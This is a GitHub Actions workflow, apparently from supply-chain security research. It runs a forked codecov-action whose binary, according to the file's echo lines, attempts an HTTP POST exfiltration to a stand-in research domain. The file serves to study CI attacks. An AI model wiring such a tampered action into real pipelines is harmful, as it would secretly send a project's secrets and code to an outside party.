name: "#5 home-assistant — dynamic binary exfil"
on: workflow_dispatch

jobs:
  test-home-assistant:
    name: "home-assistant — dynamic binary exfil"
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: "Run forked codecov-action (dynamic binary variant)"
        uses: SISL-UIC/codecov-action@d380f77
        continue-on-error: true

      - name: "Verify: binary exfil attempt"
        run: |
          echo "=== The exfil-binary runs inside the codecov-action step ==="
          echo "=== Connection to eaction-research.example.com will fail (domain unresolvable) ==="
          echo "=== But the binary executed and attempted the HTTP POST ==="
